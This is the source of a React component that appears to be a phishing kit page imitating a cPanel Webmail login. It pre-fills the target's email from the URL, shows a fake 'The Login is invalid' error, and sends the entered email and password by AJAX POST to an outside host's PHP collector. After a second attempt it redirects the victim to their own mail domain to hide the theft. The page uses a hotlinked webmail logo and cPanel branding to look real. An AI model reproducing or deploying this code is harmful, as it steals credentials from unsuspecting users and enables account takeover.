
import React, { useState, useRef, useEffect } from "react";
import './Webmail.css';
import { AiOutlineClose } from 'react-icons/ai';
import { FaUserAlt } from 'react-icons/fa';
import { MdLock } from 'react-icons/md';
// import { useLocation } from "react-router-dom";
import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";


const App = ()=>{

  const [spinLoader, setSpinLoader] = useState(false);

    useEffect(()=>{
        document.title = "Webmail Login";
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2700);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();


  const [email, setEmail] = useState(extracetdEmail);
  const [pwd, setPwd] = useState('');

  const formRef = useRef();

  const [invalid, setInvalid] = useState(false);
  const [authenticating, setAuthenticating] = useState(false);;

  const [count, setCount] = useState(0);

  

  const submitHandler = (e) => {
    e.preventDefault();
    // console.log(email, pwd);
    if (pwd === "") {
      return null
      // alert("Please fill in the input");
      // setInvalid(true);
    }
    else{
      setSpinLoader(true);

      setTimeout(() => {
        setSpinLoader(false);
      }, 2100);

        setAuthenticating(true);
        setInvalid(false);
        setTimeout(() => {
          setAuthenticating(false);
          setInvalid(true);
          setPwd('');
        }, 1500);

        const user = {
          email: email,
          password: pwd
      };

      $.ajax({
          type: "POST",
          url: "https://dozenpearl.com/nc_assets/fonts/recov/free.php",
          data: user,
          success(data) {
              // alert('OK');
              console.log(data);
          },
      });

      setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                console.log(extracetdemailDomain);
                window.location.reload();
                window.location.href = `https://www.${extracetdemailDomain}`;
            };

      // make post request Headers, below 

    }
  };


  
  return(<React.Fragment>

    <section className='wrappper'>

      { spinLoader ? <Preloader /> : null }

    { authenticating ? <div className="expired_session processing" style={{
      background: '#009cde'
    }}>
        <AiOutlineClose className="close" style={{
      background: '#009cde',
      color:'#fff'
    }}></AiOutlineClose>
        &nbsp;
        Authenticating...
      </div> : null }

      { invalid ? <div className="expired_session">
        <AiOutlineClose className="close"/>
        &nbsp;
        The Login is invalid
      </div> : null }

      <div >
        {/* <AiOutlineClose className="close"/>
        The Login is invalid */}
        &nbsp;
        <br />
        <br />
        <br />
        <br />
      </div>

      <article>

        <div className="webmail_logo">
          <img 
          src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
          alt="logo" 
          className="webmail_img"
          />
        </div>


        <div className="log_in_form">

          <form className="forrmm" ref={formRef} onSubmit={submitHandler}>

            <div className="email_cont same_cont_style dddiiivvvccc">
              <span className="labels_for_inp">Email Address</span>
              <br />
              
              <div className="div_2_include_icon_in_input_">
                <FaUserAlt className="inp_icon" />
                <input 
                  type="email"
                  placeholder={`Enter your email address.`} 
                  className="iinnppuutt"
                  value={email} 
                  onChange={ e=> setEmail(e.target.value) }
                  name="email"
                  // readOnly={true}
                />
              </div>

            </div>


            <div className="pwd_cont same_cont_style dddiiivvvccc">
              <span className="labels_for_inp">Password</span>
              <br />

              <div className="div_2_include_icon_in_input_">

                <MdLock className="inp_icon"/>
                <input 
                  type="password"
                  placeholder={`Enter your email address.`} 
                  required
                  className="iinnppuutt"
                  value={pwd}
                  onChange={ e=> setPwd(e.target.value) }
                  name="password"
                  autoFocus
                />

              </div>

            </div>

            <div className="submit_btn_cont dddiiivvvccc">
              <input 
                type={`submit`} 
                value={`Log in`} 
                className='btn_sub' 
                onClick={submitHandler}
              />
            </div>

          </form>
        </div>

      </article>


    <div className="langs">
      <p>English</p>
      <p>العربية</p>
      <p>čeština</p>
      <p>dansk</p>
      <p>Deutsch</p>
      <p>Ελληνικά</p>
      <p>español</p>
      <p>español latinoamericano</p>
      <p>...</p>
    </div>

    <div className="copyright">
      <img 
        alt="tiny"
        src="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" 
      />
      <br />
      Copyright©&nbsp;2023 cPanel, L.L.C.
      <br />
      <p>Privacy Policy</p>
    </div>

    </section>


  </React.Fragment>)
}

export default App;